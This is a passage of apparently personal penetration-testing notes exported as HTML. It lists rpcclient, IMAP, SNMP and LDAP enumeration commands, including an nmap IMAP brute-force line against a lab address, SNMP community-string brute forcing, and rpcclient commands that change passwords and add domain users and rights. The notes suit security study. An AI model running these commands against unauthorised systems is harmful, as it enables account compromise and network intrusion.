  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate users
  (output in SID) in groups</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>queryaliasmem
  [Builtin|Domain] &lt;rid&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Change users
  password (must log in to rpcclient as user)</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>setuserinfo2
  &lt;username&gt; 23 '&lt;password&gt;'</p>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>23 is the
       USER_INTERAL4_INFORMATION field.<span style='mso-spacerun:yes'>�
       </span>It does things in cleartext.<span style='mso-spacerun:yes'>�
       </span>24 supports encrpytion</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>NT_STATUS_PASSWORD_RESTRICTION
       means there was a password complexity failure and the password did not
       change</span></li>
  </ul>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate Domains</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>enumdomains</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Domain SID</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>lsaquery</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Domain info</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>querydominfo</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Create domain user</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>createdomuser</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>delete domain user</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>deletedomuser</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Add rights to user
  account</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>lsaaddacctrights</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Remove rights from
  user account</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>lsaremoveacctrights</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate trusted
  domain within AD forest</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:9.1694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>dsenumdomtrusts</p>
  </td>
 </tr>
</table>

</div>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:6.0145in'>

<div style='direction:ltr;margin-top:0in;margin-left:.075in;width:2.2708in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>143 TCP /
IMAP</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.075in;width:2.3423in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Thursday,
May 13, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>10:33
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:6.0145in'>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3083in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>nmap brute force</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.1263in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>nmap -sV --script
  imap-brute -p 143 10.11.1.115</p>
  </td>
 </tr>
</table>

</div>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>IMAP Commands:</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Login</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:4.05in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>LOGIN
  &lt;username&gt; &lt;password&gt;<br>
    - If enclosing values with quotes they must be escaped with a \</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>List
  Folders/Mailboxes</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.9805in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>A1 LIST
  &quot;&quot; *<br>
    A1 LIST INBOX *<br>
    A1 LIST &quot;Archive&quot; *</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8902in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Create new
  folder/mailbox</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.9611in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>A1 CREATE
  INBOX.Archive.2012<br>
    A1 CREATE &quot;To Read&quot;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Delete
  folder/mailbox</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.9805in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>A1 DELETE
  INBOX.Archive.2012<br>
    A1 DELETE &quot;To Read&quot;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Rename
  folder/mailbox</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.9805in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>A1 RENAME
  &quot;INBOX.One&quot; &quot;INBOX.Two&quot;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>List Subscribed
  mailboxes</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.9805in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>A1 LSUB
  &quot;&quot; *</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Status of mailbox</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.9805in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>A1 STATUS INBOX
  (messages unseen recent)</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Select a mailbox</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.9805in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>A1 SELECT INBOX</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>List messages</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.9805in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>A1 FETCH 1:*
  (flags)<br>
    A1 UID FETCH 1:* (flags)</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Retrieve message
  content</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.9805in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>A1 FETCH 2
  body[text]<br>
    A1 FETCH 2 all<br>
    A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Close mailbox</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.9805in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>A1 CLOSE</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.8708in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Logout</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.9805in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>A1 LOGOUT</p>
  </td>
 </tr>
</table>

</div>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:7.5875in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.4111in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>161 UDP /
SNMP</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.3986in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
February 8, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>4:48
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:7.5875in'>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>SNMP Management Information
     Base (MIB) - A database containing information usually related to network
     management</span></li>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Simple Network Management
     Protocol.<span style='mso-spacerun:yes'>  </span>Used for the manag
ement
     and monitoring of network devices.</span></li>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Susceptible to IP spoofing
     and replay attacks because it is based on UDP</span></li>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>SNMP 1, 2, and 2c do not
     encrypt traffic.<span style='mso-spacerun:yes'>  </span>Credentials
 and
     information can be intercepted over the local network.</span></li>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Commonly left with configured
     with default public and private community strings.<span
     style='mso-spacerun:yes'>  </span>Default read-only community strin
g is
     usually &quot;public&quot;</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Community Strings/MIB
      Values:</span></li>
 </ul>
</ul>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt;margin-left:.7083in' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>TCP Local Ports</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3729in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>1.3.6.1.2.1.6.13.1.3</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>User Accounts</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.4354in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>1.3.6.1.4.1.77.1.2.25</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Software Name</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.4423in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>1.3.6.1.2.1.25.6.3.1.2</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Storage Units</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.4423in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>1.3.6.1.2.1.25.2.3.1.4</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Processes Path</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.4423in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>1.3.6.1.2.1.25.4.2.1.4</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3597in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Running Programs</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.4229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>1.3.6.1.2.1.25.4.2.1.2
  </p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3402in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin-top:5pt;margin-bottom:5pt;font-family:Calibri;font-size:
  11.0pt'>System Processes</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3923in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin-top:5pt;margin-bottom:5pt;font-family:Calibri;font-size:
  11.0pt'>1.3.6.1.2.1.25.1.6.0 </p>
  </td>
 </tr>
</table>

</div>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Tools:</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>onesixtyone - SNMP scanner -
      brute force community strings</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>snmpwalk - probe and query
      SNMP values using a community string</span></li>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle;font-size:
       11.0pt'>
       <div style='direction:ltr'>
       <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:
        ltr;border-collapse:collapse;border-style:solid;border-color:#A3A3A3;
        border-width:1pt' title="" summary="">
        <tr>
         <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
         vertical-align:top;width:2.0506in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
         <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate
         full MIB Tree</p>
         </td>
         <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
         vertical-align:top;width:4.3236in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
         <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>snmpwalk -c
         public -v1 -t 10 &lt;ip address&gt;</p>
         <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>snmpwalk -c
         public -v 2c -c public &lt;ip address&gt;</p>
         </td>
        </tr>
        <tr>
         <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
         vertical-align:top;width:2.0701in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
         <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Enumerate
         Specific MIB value</p>
         </td>
         <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
         vertical-align:top;width:4.3736in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
         <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>snmpwalk -c
         public -v1 &lt;ip address&gt; &lt;Community String/MIB Value&gt;</p>
         </td>
        </tr>
       </table>
       </div>
   </li>
  </ul>
 </ul>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:12.0916in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.2527in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>389 TCP /
LDAP</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.2381in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
April 12, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>9:49
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:.1263in;width:11.9652in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>TCP 389 LDAP plain text</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Used for requesting
      information from the local domain controller. </span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>LDAP requests sent to port
      389 can be used to search for objects only within the global catalogâ
�
      home domain. </span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>The requesting application
      can obtain all of the attributes for those objects. </span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>For example, a request to
       port 389 could be used to obtain a user’s department</span></l
  </ul>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Tools:</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>nmap --script ldap-search</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>List on localhost for ldap
       traffic</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>tcpdump -i lo -nnXs 0
        'port 389'</span></li>
    <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
     margin-bottom:0in'>
     <li style='margin-top:0;margin-bottom:0;vertical-align:middle;font-size:
         11.0pt'>
         <div style='direction:ltr'>
         <table border=1 cellpadding=0 cellspacing=0 valign=top
          style='direction:ltr;border-collapse:collapse;border-style:solid;
          border-color:#A3A3A3;border-width:1pt' title="" summary="">
          <tr>
           <td style='border-style:solid;border-color:#A3A3A3;border-width:
           1pt;vertical-align:top;width:2.5986in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
           <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Do not
           convert hosts or ports to name</p>
           </td>
           <td style='border-style:solid;border-color:#A3A3A3;border-width:
           1pt;vertical-align:top;width:.5354in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
           <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>nn</p>
           </td>
          </tr>
          <tr>
           <td style='border-style:solid;border-color:#A3A3A3;border-width:
           1pt;vertical-align:top;width:2.5791in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
           <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Print in
           ascii and hex</p>
           </td>
           <td style='border-style:solid;border-color:#A3A3A3;border-width:
           1pt;vertical-align:top;width:.5548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
           <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>X</p>
           </td>
          </tr>
          <tr>
           <td style='border-style:solid;border-color:#A3A3A3;border-width:
           1pt;vertical-align:top;width:2.5791in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
           <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Capture
           entire packet</p>
           </td>
           <td style='border-style:solid;border-color:#A3A3A3;border-width:
           1pt;vertical-align:top;width:.5548in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
           <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-s 0</p>
           </td>
          </tr>
         </table>
         </div>
     </li>
    </ul>
   </ul>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>ldapsearch</span></li>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:.7083in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.4486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Basic search</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:7.8048in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>ldapsearch -h
   &lt;ip address&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.4486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Simple
